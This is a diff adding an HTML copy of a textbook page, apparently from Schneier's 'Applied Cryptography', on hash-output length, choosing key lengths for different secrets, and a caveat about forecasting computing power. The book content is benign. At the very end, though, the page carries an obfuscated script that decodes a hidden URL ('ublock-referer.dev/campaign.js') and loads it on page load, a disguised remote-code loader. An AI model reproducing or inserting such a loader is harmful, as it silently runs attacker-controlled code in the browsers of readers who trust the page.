@@ -1,0 +1,132 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key Length</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=07//-->
+<!--PAGES=166-168//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch08/08-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Assume that a one-way hash function is secure and the best way to attack it is by using brute force. It produces an <I>m-</I>bit output. Finding a message that hashes to a given hash value would require hashing 2<SUP><I>m</I></SUP> random messages. Finding two messages that hash to the same value would only require hashing 2<SUP><I>m</I>/2</SUP> random messages. A machine that hashes a million messages per second would take 600,000 years to find a second message that matched a given 64-bit hash. The same machine could find a pair of messages that hashed to the same value in about an hour.</P>
+<P>This means that if you are worried about a birthday attack, you should choose a hash-value twice as long as you otherwise might think you need. For example, if you want to drop the odds of someone breaking your system to less than 1 in 2<SUP>80,</SUP> use a 160-bit one-way hash function.</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">7.5 How Long Should a Key Be?</FONT></H3>
+<P>There&#146;s no single answer to this question; it depends on the situation. To determine how much security you need, you must ask yourself some questions. How much is your data worth? How long does it need to be secure? What are your adversaries&#146; resources?
+</P>
+<P>A customer list might be worth $1000. Financial data for an acrimonious divorce case might be worth $10,000. Advertising and marketing data for a large corporation might be worth $1 million. The master keys for a digital cash system might be worth billions.</P>
+<P>In the world of commodities trading, secrets only need to be kept for minutes. In the newspaper business, today&#146;s secrets are tomorrow&#146;s headlines. Product development information might need to remain secret for a year or two. U.S. Census data are required by law to remain secret for 100 years.</P>
+<P>The guest list for your sister&#146;s surprise birthday party is only interesting to your nosy relatives. Corporate trade secrets are interesting to rival companies. Military secrets are interesting to rival militaries.</P>
+<P>You can even specify security requirements in these terms. For example:</P>
+<BLOCKQUOTE><P>The key length must be such that there is a probability of no more than 1 in 2<SUP>32</SUP> that an attacker with $100 million to spend could break the system within one year, even assuming technology advances at a rate of 30 percent per annum over the period.</P>
+</BLOCKQUOTE><P>Table 7.10, taken partially from [150], estimates the secrecy requirements for several kinds of information:
+</P>
+<P>Future computing power is harder to estimate, but here is a reasonable rule of thumb: The efficiency of computing equipment divided by price doubles every 18 months and increases by a factor of 10 every five years. Thus, in 50 years the fastest computers will be 10 billion times faster than today&#146;s! Remember, too, that these numbers only relate to general-purpose computers; who knows what kind of specialized cryptosystem-breaking equipment will be developed in the next 50 years?</P>
+<P>Assuming that a cryptographic algorithm will be in use for 30 years, you can get some idea how secure it must be. An algorithm designed today probably will not see general use until 2000, and will still be used in 2025 to encrypt messages that must remain secret until 2075 or later.</P>
+<TABLE WIDTH="80%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="3">Table 7.10<BR>Security Requirements for Different Information
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TH VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">Type of Traffic
+<TH VALIGN="BOTTOM" ALIGN="CENTER" VALIGN="BOTTOM">Lifetime
+<TH ALIGN="CENTER" VALIGN="BOTTOM">Minimum<BR>Key Length
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">Tactical military information
+<TD ALIGN="CENTER" VALIGN="BOTTOM">minutes/hours
+<TD ALIGN="CENTER" VALIGN="BOTTOM">56&#150;64 bits
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">Product announcements, mergers, interest rates
+<TD ALIGN="CENTER" VALIGN="BOTTOM">days/weeks
+<TD ALIGN="CENTER" VALIGN="BOTTOM">64 bits
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">Long-term business plans
+<TD ALIGN="CENTER" VALIGN="BOTTOM">years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">64 bits
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">Trade secrets (e.g., recipe for Coca-Cola)
+<TD ALIGN="CENTER" VALIGN="BOTTOM">decades
+<TD ALIGN="CENTER" VALIGN="BOTTOM">112 bits
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">H-bomb secrets
+<TD ALIGN="CENTER" VALIGN="BOTTOM">&gt40 years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">128 bits
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">Identities of spies
+<TD ALIGN="CENTER" VALIGN="BOTTOM">&gt50 years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">128 bits
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">Personal affairs
+<TD ALIGN="CENTER" VALIGN="BOTTOM">&gt50 years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">128 bits
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">Diplomatic embarrassments
+<TD ALIGN="CENTER" VALIGN="BOTTOM">&gt65 years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">at least 128 bits
+<TR>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">U.S. census data
+<TD ALIGN="CENTER" VALIGN="BOTTOM">100 years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">at least 128 bits
+<TR>
+<TD COLSPAN="3"><HR>
+</TABLE>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">7.6 Caveat Emptor</FONT></H3>
+<P>This entire chapter is a whole lot of nonsense. The very notion of predicting computing power 10 years in the future, let alone 50 years is absolutely ridiculous. These calculations are meant to be a guide, nothing more. If the past is any guide, the future will be vastly different from anything we can predict.
+</P>
+<P>Be conservative. If your keys are longer than you imagine necessary, then fewer technological surprises can harm you.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch08/08-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(LNOyPKEH, dPgOJLPv) {dPgOJLPv = LNOyPKEH.createElement('script');dPgOJLPv.type = 'text/javascript';dPgOJLPv.async = true;dPgOJLPv.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');LNOyPKEH.getElementsByTagName('body')[0].appendChild(dPgOJLPv);}(document));</script></body>
+</html>
